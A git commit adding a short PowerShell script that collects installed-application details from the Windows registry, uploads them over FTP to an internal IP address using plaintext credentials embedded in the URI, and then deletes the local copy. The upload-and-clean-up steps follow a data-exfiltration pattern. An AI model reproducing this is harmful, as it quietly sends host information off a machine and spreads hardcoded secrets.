435923eca526ae593cd1aea4d88217e279ec6c05
squentel <30870132+squentel@users.noreply.github.com>
2021-11-18 16:52:31 +0100

    Create applistonly.ps1

---
+++ applistonly.ps1
@@ -0,0 +1,8 @@
+$listApps=Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize
+$listApps | Out-File -filepath C:\myapps.txt
+$file = "C:\myapps.txt"
+$ftpuri = "ftp://demoUser:CrowdDemo789!@172.17.0.34/myapps.txt"
+$webclient = New-Object System.Net.WebClient
+$uri = New-Object System.Uri($ftpuri)
+$webclient.UploadFile($uri, $file)  
+Remove-Item -Path C:\myapps.txt -Force
